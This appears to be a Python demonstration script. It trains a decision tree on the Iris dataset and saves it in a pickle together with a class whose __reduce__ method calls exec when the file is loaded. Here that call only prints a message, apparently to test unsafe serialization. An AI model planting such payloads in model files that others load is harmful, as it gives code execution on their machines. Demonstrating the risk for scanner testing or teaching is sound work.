#!/usr/bin/env python3

import pickle
from sklearn.datasets import load_iris
from sklearn.model_selection import train_test_split
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import accuracy_score

# Step 1: Load the dataset
iris = load_iris()
X = iris.data  # Features
y = iris.target  # Labels

# Step 2: Split data into training and testing sets
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=42)

# Step 3: Choose a simple model (Decision Tree)
model = DecisionTreeClassifier()

# Step 4: Train the model
model.fit(X_train, y_train)

# Unsafe: Step 5: Add an exec command for testing unsafe serialization
class MaliciousCode:
    def __reduce__(self):
        return (exec, ('print("This is malicious code")',))

malicious_payload = MaliciousCode()

# Step 6: Save both the trained model and malicious code to a file using pickle
with open('unsafe_model.pkl', 'wb') as f:
    pickle.dump((model, malicious_payload), f)

# (Optional) Step 7: Load the model and payload from the file using pickle
with open('unsafe_model.pkl', 'rb') as f:
    loaded_model, loaded_payload = pickle.load(f)

# Step 8: Make predictions with the loaded model
y_pred = loaded_model.predict(X_test)

# Step 9: Evaluate the model
accuracy = accuracy_score(y_test, y_pred)
print(f"Accuracy: {accuracy * 100:.2f}%")
